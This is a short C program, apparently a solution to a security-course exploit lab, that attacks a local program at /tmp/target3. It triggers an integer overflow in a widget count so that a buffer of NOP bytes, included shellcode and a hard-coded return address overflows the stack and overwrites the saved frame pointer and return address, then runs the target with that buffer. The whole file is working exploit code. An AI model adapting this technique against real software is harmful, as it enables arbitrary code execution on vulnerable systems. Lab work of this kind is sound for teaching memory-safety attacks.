#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  struct widget_t {
    double x;
    double y;
    int count;
  };
  const size_t num_widget = 240;
  const size_t max_int = 2147483647;
  //printf("%u\n", ((int) (max_int + 1)) * 2); // this is zero, we just need to add what we want for our buffer overflow

  const size_t size = (num_widget + 1) * sizeof(struct widget_t); // + 1 because we need more bytes (10 for max_int, 1 for ',', 4 to overflow ebp and 4 for ret)
  char attack[size];
  memset(attack, 0x90, size);
  char ret[] = "\xd0\xfc\xff\xbf";

  size_t int_overflow = max_int + 1;
  int_overflow += num_widget + 1; // let's add what some bytes to overflow over ebp and ret
  
  sprintf(attack, "%u", int_overflow);
  memcpy(attack + strlen(attack), ",", 1);
  memcpy(attack + (size - 50), shellcode, 45);
  memcpy(attack + (size - 5), ret, 4);
  
  args[0] = TARGET; args[1] = attack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
